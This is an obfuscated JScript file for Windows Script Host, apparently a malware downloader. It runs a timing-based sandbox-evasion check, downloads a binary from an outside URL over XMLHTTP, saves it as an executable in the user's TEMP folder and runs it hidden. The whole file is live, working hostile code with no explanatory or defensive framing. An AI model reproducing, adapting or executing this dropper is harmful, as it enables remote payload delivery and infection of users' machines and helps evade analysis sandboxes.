var _JK = false;
var _F = "CreateObject";
var _ZP = function _CL() {return WScript[_F]("WScript"+".Shell");}(), _SW = 11;
var _D = "MSXML2.XMLHTTP";
var _R0 = 2123213;
var _I0 = 0;
function _Y(_VI){_ZP["Run"](_VI, _I0, _I0);};
function _B(){return _D + "";};
function _J(_Q, _EK){_I0 = _I0 * 1; return _Q - _EK;};
function _H0(){return _F;};
/*@cc_on
  @if (@_win32 || @_win64)
    _JK = true;
  @end
@*/
if (_JK)
{
var _Z = "";
function _WK(){return 22;};
var _W = 0; var _TY = 0;
function _I()
{
var _T0 = new this["Date"]();
var _JF = _T0["getUTCMilliseconds"]();
WScript["Sleep"](_WK());
var _T0 = new this["Date"]();
var _QC = _T0["getUTCMilliseconds"]();
WScript["Sleep"](_WK());
var _T0 = new this["Date"]();
var _T = _T0["getUTCMilliseconds"]();
var _W = "_R";
_W = _J(_QC, _JF);
var _TY = "_O";
_TY = _J(_T, _QC);
_Z = "open";
return _J(_W, _TY);
}
var _G = false;
var _R1 = false;
for (var _DW = _I0; _DW < _WK() * 1; _DW++){if (_I() != _I0){
_G = true; 
_TY = "31" + 11 * _W + _TY; 
_R1 = true; 
break;
}}
function _H() {return ((_G == true) && (_G == _R1)) ? 1 : _I0;};
if (_G && _H() && _R1){
function _NC() {return _ZP["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "puRQxXpFzVrWobgk.ex" + "e";};
 _ZZ = _B();
 _Z0 = WScript[_F](_ZZ);
 var _QM = 1;
 while (_QM){
try {
	if (_QM == 1)
	{
		_Z0[_Z]("GET", "http://bqsc.pt/c6ska", false);
		_Z0["send"]();
		_PL = "Sleep";
	}
	WScript[_PL](_WK() + 120); 
	if (_Z0["readystate"] < 2 * 2) continue;
	_QM = _I0;
	function _LA(_YT) {var _V = (1, 2, 3, 4, 5, _YT); return _V;};
	_MY = WScript[_H0()]("ADODB.Stream");
	_ZZ = _MY;
	_ZZ[_Z]();
	_ZZ["type"] = _LA(1);
	_ZZ["write"](_Z0["ResponseBody"]);
	_MY["position"] = _LA(_I0);
	_ZZ["Save" + "ToFile"](_NC(), 2);
	_MY["cl"+"ose"]();
	_S = _NC();
	_Y(_S);
} catch(_J0){};
}
}
}

